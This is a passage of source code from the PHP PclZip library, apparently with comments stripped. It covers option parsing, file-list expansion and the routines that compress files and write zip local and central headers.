        case PCLZIP_OPT_BY_INDEX :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $v_work_list = array();
          if (is_string($p_options_list[$i+1])) {
              $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');
              $v_work_list = explode(",", $p_options_list[$i+1]);
          } else if (is_integer($p_options_list[$i+1])) {
              $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
          } else if (is_array($p_options_list[$i+1])) {
              $v_work_list = $p_options_list[$i+1];
          } else {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $v_sort_flag=false;
          $v_sort_value=0;
          for ($j=0; $j<sizeof($v_work_list); $j++) {
              $v_item_list = explode("-", $v_work_list[$j]);
              $v_size_item_list = sizeof($v_item_list);
              if ($v_size_item_list == 1) {
                  $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                  $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
              } elseif ($v_size_item_list == 2) {
                  $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                  $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
              } else {
                  PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");
                  return PclZip::errorCode();
              }
              if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                  $v_sort_flag=true;
                  PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");
                  return PclZip::errorCode();
              }
              $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
          }
          $i++;
        break;
        case PCLZIP_OPT_REMOVE_ALL_PATH :
        case PCLZIP_OPT_EXTRACT_AS_STRING :
        case PCLZIP_OPT_NO_COMPRESSION :
        case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
        case PCLZIP_OPT_REPLACE_NEWER :
        case PCLZIP_OPT_STOP_ON_ERROR :
          $v_result_list[$p_options_list[$i]] = true;
        break;
        case PCLZIP_OPT_SET_CHMOD :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          $i++;
        break;
        case PCLZIP_CB_PRE_EXTRACT :
        case PCLZIP_CB_POST_EXTRACT :
        case PCLZIP_CB_PRE_ADD :
        case PCLZIP_CB_POST_ADD :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $v_function_name = $p_options_list[$i+1];
          if (!function_exists($v_function_name)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $v_result_list[$p_options_list[$i]] = $v_function_name;
          $i++;
        break;
        default :
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Unknown parameter '".$p_options_list[$i]."'");
          return PclZip::errorCode();
      }
      $i++;
    }
    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($v_result_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
    return $v_result;
  }
  function privOptionDefaultThreshold(&$p_options) {
    $v_result=1;
    if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]) || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) { return $v_result; }
    $v_memory_limit = ini_get('memory_limit');
    $v_memory_limit = trim($v_memory_limit);
    $last = strtolower(substr($v_memory_limit, -1));
    if($last == 'g')
        $v_memory_limit = $v_memory_limit*1073741824;
    if($last == 'm')
        $v_memory_limit = $v_memory_limit*1048576;
    if($last == 'k')
        $v_memory_limit = $v_memory_limit*1024;
    $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
    if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) { unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]); }
    return $v_result;
  }
  function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false) {
    $v_result=1;
    foreach ($p_file_list as $v_key => $v_value) {
      if (!isset($v_requested_options[$v_key])) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");
        return PclZip::errorCode();
      }
      switch ($v_key) {
        case PCLZIP_ATT_FILE_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            return PclZip::errorCode();
          }
          $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
          if ($p_filedescr['filename'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
            return PclZip::errorCode();
          }
        break;
        case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            return PclZip::errorCode();
          }
          $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);
          if ($p_filedescr['new_short_name'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
            return PclZip::errorCode();
          }
        break;
        case PCLZIP_ATT_FILE_NEW_FULL_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            return PclZip::errorCode();
          }
          $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);
          if ($p_filedescr['new_full_name'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
            return PclZip::errorCode();
          }
        break;
        case PCLZIP_ATT_FILE_COMMENT :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            return PclZip::errorCode();
          }
          $p_filedescr['comment'] = $v_value;
        break;
        case PCLZIP_ATT_FILE_MTIME :
          if (!is_integer($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
            return PclZip::errorCode();
          }
          $p_filedescr['mtime'] = $v_value;
        break;
        case PCLZIP_ATT_FILE_CONTENT :
          $p_filedescr['content'] = $v_value;
        break;
        default :
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Unknown parameter '".$v_key."'");
          return PclZip::errorCode();
      }
      if ($v_requested_options !== false) {
        for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
          if ($v_requested_options[$key] == 'mandatory') {
            if (!isset($p_file_list[$key])) {
              PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
              return PclZip::errorCode();
            }
          }
        }
      }
    }
    return $v_result;
  }
  function privFileDescrExpand(&$p_filedescr_list, &$p_options) {
    $v_result=1;
    $v_result_list = array();
    for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
      $v_descr = $p_filedescr_list[$i];
      $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
      $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
      if (file_exists($v_descr['filename'])) {
        if (@is_file($v_descr['filename'])) { $v_descr['type'] = 'file'; }
        else if (@is_dir($v_descr['filename'])) { $v_descr['type'] = 'folder'; }
        else if (@is_link($v_descr['filename'])) { continue; }
        else { continue; }
      }
      else if (isset($v_descr['content'])) { $v_descr['type'] = 'virtual_file'; }
      else {
        PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");
        return PclZip::errorCode();
      }
      $this->privCalculateStoredFilename($v_descr, $p_options);
      $v_result_list[sizeof($v_result_list)] = $v_descr;
      if ($v_descr['type'] == 'folder') {
        $v_dirlist_descr = array();
        $v_dirlist_nb = 0;
        if ($v_folder_handler = @opendir($v_descr['filename'])) {
          while (($v_item_handler = @readdir($v_folder_handler)) !== false) {
            if (($v_item_handler == '.') || ($v_item_handler == '..')) { continue; }
            $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
            if (($v_descr['stored_filename'] != $v_descr['filename']) && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
              if ($v_descr['stored_filename'] != '') {
                $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
              } else {
                $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
              }
            }
            $v_dirlist_nb++;
          }
          @closedir($v_folder_handler);
        }
        if ($v_dirlist_nb != 0) {
          if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) { return $v_result; }
          $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
        }
        unset($v_dirlist_descr);
      }
    }
    $p_filedescr_list = $v_result_list;
    return $v_result;
  }
  function privCreate($p_filedescr_list, &$p_result_list, &$p_options) {
    $v_result=1;
    $v_list_detail = array();
    $this->privDisableMagicQuotes();
    if (($v_result = $this->privOpenFd('wb')) != 1) { return $v_result; }
    $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }
  function privAdd($p_filedescr_list, &$p_result_list, &$p_options) {
    $v_result=1;
    $v_list_detail = array();
    if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0)) {
      $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);
      return $v_result;
    }
    $this->privDisableMagicQuotes();
    if (($v_result=$this->privOpenFd('rb')) != 1) {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1) {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    @rewind($this->zip_fd);
    $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';
    if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0) {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');
      return PclZip::errorCode();
    }
    $v_size = $v_central_dir['offset'];
    while ($v_size != 0) {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = fread($this->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;
    $v_header_list = array();
    if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1) {
      fclose($v_zip_temp_fd);
      $this->privCloseFd();
      @unlink($v_zip_temp_name);
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_offset = @ftell($this->zip_fd);
    $v_size = $v_central_dir['size'];
    while ($v_size != 0) {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
      @fwrite($this->zip_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }
    for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++) {
      if ($v_header_list[$i]['status'] == 'ok') {
        if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
          fclose($v_zip_temp_fd);
          $this->privCloseFd();
          @unlink($v_zip_temp_name);
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }
        $v_count++;
      }
      $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
    }
    $v_comment = $v_central_dir['comment'];
    if (isset($p_options[PCLZIP_OPT_COMMENT])) { $v_comment = $p_options[PCLZIP_OPT_COMMENT]; }
    if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) { $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT]; }
    if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) { $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment; }
    $v_size = @ftell($this->zip_fd)-$v_offset;
    if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1) {
      unset($v_header_list);
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;
    $this->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->privSwapBackMagicQuotes();
    @unlink($this->zipname);
    PclZipUtilRename($v_zip_temp_name, $this->zipname);
    return $v_result;
  }
  function privOpenFd($p_mode) {
    $v_result=1;
    if ($this->zip_fd != 0) {
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');
      return PclZip::errorCode();
    }
    if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0) {
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');
      return PclZip::errorCode();
    }
    return $v_result;
  }
  function privCloseFd() {
    $v_result=1;
    if ($this->zip_fd != 0)
      @fclose($this->zip_fd);
    $this->zip_fd = 0;
    return $v_result;
  }
  function privAddList($p_filedescr_list, &$p_result_list, &$p_options) {
    $v_result=1;
    $v_header_list = array();
    if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1) { return $v_result; }
    $v_offset = @ftell($this->zip_fd);
    for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++) {
      if ($v_header_list[$i]['status'] == 'ok') {
        if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) { return $v_result; }
        $v_count++;
      }
      $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
    }
    $v_comment = '';
    if (isset($p_options[PCLZIP_OPT_COMMENT])) { $v_comment = $p_options[PCLZIP_OPT_COMMENT]; }
    $v_size = @ftell($this->zip_fd)-$v_offset;
    if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1) {
      unset($v_header_list);
      return $v_result;
    }
    return $v_result;
  }
  function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options) {
    $v_result=1;
    $v_header = array();
    $v_nb = sizeof($p_result_list);
    for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
      $p_filedescr_list[$j]['filename'] = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
      if ($p_filedescr_list[$j]['filename'] == "") { continue; }
      if (($p_filedescr_list[$j]['type'] != 'virtual_file') && (!file_exists($p_filedescr_list[$j]['filename']))) {
        PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
        return PclZip::errorCode();
      }
      if (($p_filedescr_list[$j]['type'] == 'file') || ($p_filedescr_list[$j]['type'] == 'virtual_file') || (($p_filedescr_list[$j]['type'] == 'folder') && ((!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]) || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH])))) {
        $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header, $p_options);
        if ($v_result != 1) { return $v_result; }
        $p_result_list[$v_nb++] = $v_header;
      }
    }
    return $v_result;
  }
  function privAddFile($p_filedescr, &$p_header, &$p_options) {
    $v_result=1;
    $p_filename = $p_filedescr['filename'];
    if ($p_filename == "") {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");
      return PclZip::errorCode();
    }
    clearstatcache();
    $p_header['version'] = 20;
    $p_header['version_extracted'] = 10;
    $p_header['flag'] = 0;
    $p_header['compression'] = 0;
    $p_header['crc'] = 0;
    $p_header['compressed_size'] = 0;
    $p_header['filename_len'] = strlen($p_filename);
    $p_header['extra_len'] = 0;
    $p_header['disk'] = 0;
    $p_header['internal'] = 0;
    $p_header['offset'] = 0;
    $p_header['filename'] = $p_filename;
    $p_header['stored_filename'] = $p_filedescr['stored_filename'];
    $p_header['extra'] = '';
    $p_header['status'] = 'ok';
    $p_header['index'] = -1;
    if ($p_filedescr['type']=='file') {
      $p_header['external'] = 0x00000000;
      $p_header['size'] = filesize($p_filename);
    } else if ($p_filedescr['type']=='folder') {
      $p_header['external'] = 0x00000010;
      $p_header['mtime'] = filemtime($p_filename);
      $p_header['size'] = filesize($p_filename);
    } else if ($p_filedescr['type'] == 'virtual_file') {
      $p_header['external'] = 0x00000000;
      $p_header['size'] = strlen($p_filedescr['content']);
    }
    if (isset($p_filedescr['mtime'])) {
      $p_header['mtime'] = $p_filedescr['mtime'];
    } else if ($p_filedescr['type'] == 'virtual_file') {
      $p_header['mtime'] = time();
    } else {
      $p_header['mtime'] = filemtime($p_filename);
    }
    if (isset($p_filedescr['comment'])) {
      $p_header['comment_len'] = strlen($p_filedescr['comment']);
      $p_header['comment'] = $p_filedescr['comment'];
    } else {
      $p_header['comment_len'] = 0;
      $p_header['comment'] = '';
    }
    if (isset($p_options[PCLZIP_CB_PRE_ADD])) {
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_header, $v_local_header);
      $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
      if ($v_result == 0) {
        $p_header['status'] = "skipped";
        $v_result = 1;
      }
      if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
        $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
      }
    }
    if ($p_header['stored_filename'] == "") { $p_header['status'] = "filtered"; }
    if (strlen($p_header['stored_filename']) > 0xFF) { $p_header['status'] = 'filename_too_long'; }
    if ($p_header['status'] == 'ok') {
      if ($p_filedescr['type'] == 'file') {
        if ((!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON]) || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]) && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
          $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) { return $v_result; }
        } else {
          if (($v_file = @fopen($p_filename, "rb")) == 0) {
            PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
            return PclZip::errorCode();
          }
          $v_content = @fread($v_file, $p_header['size']);
          @fclose($v_file);
          $p_header['crc'] = @crc32($v_content);
          if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
            $p_header['compressed_size'] = $p_header['size'];
            $p_header['compression'] = 0;
          } else {
            $v_content = @gzdeflate($v_content);
            $p_header['compressed_size'] = strlen($v_content);
            $p_header['compression'] = 8;
          }
          if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
            @fclose($v_file);
            return $v_result;
          }
          @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
        }
      } else if ($p_filedescr['type'] == 'virtual_file') {
        $v_content = $p_filedescr['content'];
        $p_header['crc'] = @crc32($v_content);
        if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
          $p_header['compressed_size'] = $p_header['size'];
          $p_header['compression'] = 0;
        } else {
          $v_content = @gzdeflate($v_content);
          $p_header['compressed_size'] = strlen($v_content);
          $p_header['compression'] = 8;
        }
        if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
          @fclose($v_file);
          return $v_result;
        }
        @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
      } else if ($p_filedescr['type'] == 'folder') {
        if (@substr($p_header['stored_filename'], -1) != '/') { $p_header['stored_filename'] .= '/'; }
        $p_header['size'] = 0;
        if (($v_result = $this->privWriteFileHeader($p_header)) != 1) { return $v_result; }
      }
    }
    if (isset($p_options[PCLZIP_CB_POST_ADD])) {
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_header, $v_local_header);
      $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
      if ($v_result == 0) { $v_result = 1; }
    }
    return $v_result;
  }
  function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options) {
    $v_result=PCLZIP_ERR_NO_ERROR;
    $p_filename = $p_filedescr['filename'];
    if (($v_file = @fopen($p_filename, "rb")) == 0) {
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
      return PclZip::errorCode();
    }
    $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
    if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
      fclose($v_file);
      PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
      return PclZip::errorCode();
    }
    $v_size = filesize($p_filename);
    while ($v_size != 0) {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($v_file, $v_read_size);
      @gzputs($v_file_compressed, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }
    @fclose($v_file);
    @gzclose($v_file_compressed);
    if (filesize($v_gzip_temp_name) < 18) {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
      return PclZip::errorCode();
    }
    if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
      return PclZip::errorCode();
    }
    $v_binary_data = @fread($v_file_compressed, 10);
    $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);
    $v_data_header['os'] = bin2hex($v_data_header['os']);
    @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
    $v_binary_data = @fread($v_file_compressed, 8);
    $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);
    $p_header['compression'] = ord($v_data_header['cm']);
    $p_header['crc'] = $v_data_footer['crc'];
    $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;
    @fclose($v_file_compressed);
    if (($v_result = $this->privWriteFileHeader($p_header)) != 1) { return $v_result; }
    if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
      return PclZip::errorCode();
    }
    fseek($v_file_compressed, 10);
    $v_size = $p_header['compressed_size'];
    while ($v_size != 0) {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($v_file_compressed, $v_read_size);
      @fwrite($this->zip_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }
    @fclose($v_file_compressed);
    @unlink($v_gzip_temp_name);
    return $v_result;
  }
  function privCalculateStoredFilename(&$p_filedescr, &$p_options) {
    $v_result=1;
    $p_filename = $p_filedescr['filename'];
    if (isset($p_options[PCLZIP_OPT_ADD_PATH])) { $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH]; } else { $p_add_dir = ''; }
    if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) { $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH]; } else { $p_remove_dir = ''; }
    if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) { $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH]; } else { $p_remove_all_dir = 0; }
    if (isset($p_filedescr['new_full_name'])) {
      $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
    } else {
      if (isset($p_filedescr['new_short_name'])) {
        $v_path_info = pathinfo($p_filename);
        $v_dir = '';
        if ($v_path_info['dirname'] != '') { $v_dir = $v_path_info['dirname'].'/'; }
        $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
      } else {
        $v_stored_filename = $p_filename;
      }
      if ($p_remove_all_dir) {
        $v_stored_filename = basename($p_filename);
      } else if ($p_remove_dir != "") {
        if (substr($p_remove_dir, -1) != '/') $p_remove_dir .= "/";
        if ((substr($p_filename, 0, 2) == "./") || (substr($p_remove_dir, 0, 2) == "./")) {
          if ((substr($p_filename, 0, 2) == "./") && (substr($p_remove_dir, 0, 2) != "./")) { $p_remove_dir = "./".$p_remove_dir; }
          if ((substr($p_filename, 0, 2) != "./") && (substr($p_remove_dir, 0, 2) == "./")) { $p_remove_dir = substr($p_remove_dir, 2); }
        }
        $v_compare = PclZipUtilPathInclusion($p_remove_dir, $v_stored_filename);
        if ($v_compare > 0) {
          if ($v_compare == 2) {
            $v_stored_filename = "";
          } else {
            $v_stored_filename = substr($v_stored_filename, strlen($p_remove_dir));
          }
        }
      }
      $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
      if ($p_add_dir != "") {
        if (substr($p_add_dir, -1) == "/")
          $v_stored_filename = $p_add_dir.$v_stored_filename;
        else
          $v_stored_filename = $p_add_dir."/".$v_stored_filename;
      }
    }
    $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
    $p_filedescr['stored_filename'] = $v_stored_filename;
    return $v_result;
  }
  function privWriteFileHeader(&$p_header) {
    $v_result=1;
    $p_header['offset'] = ftell($this->zip_fd);
    $v_date = getdate($p_header['mtime']);
    $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
    $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];
    $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50, $p_header['version_extracted'], $p_header['flag'], $p_header['compression'], $v_mtime, $v_mdate, $p_header['crc'], $p_header['compressed_size'], $p_header['size'], strlen($p_header['stored_filename']), $p_header['extra_len']);
    fputs($this->zip_fd, $v_binary_data, 30);
    if (strlen($p_header['stored_filename']) != 0) { fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename'])); }
    if ($p_header['extra_len'] != 0) { fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']); }
    return $v_result;
  }
  function privWriteCentralFileHeader(&$p_header) {
    $v_result=1;
    $v_date = getdate($p_header['mtime']);
    $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
    $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];
    $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50, $p_header['version'], $p_header['version_extracted'], $p_header['flag'], $p_header['compression'], $v_mtime, $v_mdate, $p_header['crc'], $p_header['compressed_size'], $p_header['size'], strlen($p_header['stored_filename']), $p_header['extra_len'], $p_header['comment_len'], $p_header['disk'], $p_header['internal'], $p_header['external'], $p_header['offset']);
    fputs($this->zip_fd, $v_binary_data, 46);
    if (strlen($p_header['stored_filename']) != 0) { fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename'])); }
    if ($p_header['extra_len'] != 0) { fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']); }
    if ($p_header['comment_len'] != 0) { fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']); }
    return $v_result;
  }
  function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment) {
    $v_result=1;
    $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries, $p_nb_entries, $p_size, $p_offset, strlen($p_comment));
